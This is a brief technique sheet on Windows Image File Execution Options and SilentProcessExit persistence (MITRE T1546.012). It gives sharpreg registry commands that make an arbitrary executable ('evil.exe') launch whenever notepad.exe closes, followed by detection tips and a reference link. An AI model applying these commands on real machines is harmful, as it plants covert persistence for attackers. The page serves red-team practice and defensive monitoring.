# [Options Injection](https://attack.mitre.org/techniques/T1546/012/)

## Exploit syntax:

```powershell

sharpreg create "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

sharpreg create "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1


# Replace the last argument with the location of the file you would like to run when the process is closed
sharpreg create "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"


```

## Detection techniques:

* Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as DEBUG_PROCESS and DEBUG_ONLY_THIS_PROCESS

* Monitor for any registry changes to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\


## Resources
https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/